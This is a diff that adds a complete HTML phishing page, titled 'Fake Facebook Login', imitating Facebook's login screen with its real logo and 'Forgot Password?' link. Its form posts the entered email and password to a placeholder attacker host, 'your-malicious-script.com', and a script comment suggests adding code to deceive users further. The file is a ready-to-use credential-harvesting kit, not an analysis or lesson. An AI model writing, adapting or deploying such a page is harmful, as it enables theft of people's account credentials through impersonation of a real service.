@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Fake Facebook Login</title>
+    <style>
+      body {
+        background: #f0f2f5;
+        font-family: Arial, sans-serif;
+      }
+      .container {
+        max-width: 320px;
+        margin: 0 auto;
+        padding: 20px;
+        background: #fff;
+        border-radius: 5px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+      h2 {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+      .logo {
+        text-align: center;
+      }
+      .logo img {
+        width: 200px;
+      }
+      input,
+      button {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: none;
+        border-radius: 3px;
+      }
+      button {
+        background: #0069e3;
+        color: #fff;
+        cursor: pointer;
+        transition: background 0.3s;
+      }
+      button:hover {
+        background: #2266b3;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
+      </div>
+      <h2>Log In</h2>
+      <form action="http://your-malicious-script.com" method="post">
+        <input type="text" name="email" placeholder="Email or Phone Number">
+        <input type="password" name="password" placeholder="Password">
+        <button type="submit">Log In</button>
+        <p><a href="https://www.facebook.com/recover/initiate">Forgot Password?</a></p>
+      </form>
+    </div>
+    <script>
+      // Code to dynamically generate content (optional)
+      // You can add JavaScript here to modify the login form or add other dynamic elements to deceive users even further.
+    </script>
+  </body>
+</html>
